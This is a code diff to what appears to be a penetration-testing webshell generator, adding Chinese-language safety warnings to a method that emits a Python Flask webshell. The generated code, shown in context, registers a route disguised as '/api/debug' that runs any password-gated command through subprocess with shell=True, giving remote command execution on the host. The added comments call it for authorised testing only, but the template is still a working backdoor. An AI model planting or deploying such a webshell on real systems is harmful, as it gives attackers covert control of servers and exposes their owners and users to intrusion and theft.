@@ -436,11 +436,19 @@ if(pwd == "{password}" && cmd != null) {{
     def python_shell(self, password: str = "") -> WebshellResult:
         """
         生成 Python Webshell (Flask/Django 环境)
+
+        ⚠️ 安全警告: 此 Webshell 使用 shell=True 执行命令，存在命令注入风险。
+        仅用于授权渗透测试，切勿在生产环境使用。
         """
         password = password or self._generate_password()
 
+        # 注意: 生成的 Webshell 代码使用 shell=True 是预期行为
+        # 因为 Webshell 需要执行任意系统命令
+        # 在实际部署时应考虑更安全的命令执行方式
         code = f"""# Python Webshell - 需要在 Flask/Django 路由中使用
+# ⚠️ 警告: 仅用于授权安全测试，切勿在生产环境使用
 import subprocess
+import shlex
 from flask import request
 
 @app.route('/api/debug', methods=['GET', 'POST'])
@@ -450,6 +458,8 @@ def debug_shell():
 
     if pwd == '{password}' and cmd:
         try:
+            # 注意: shell=True 用于支持管道和重定向
+            # 安全提示: 可改用 shlex.split(cmd) + shell=False 减少风险
             result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
             return result.decode()
         except Exception as e:
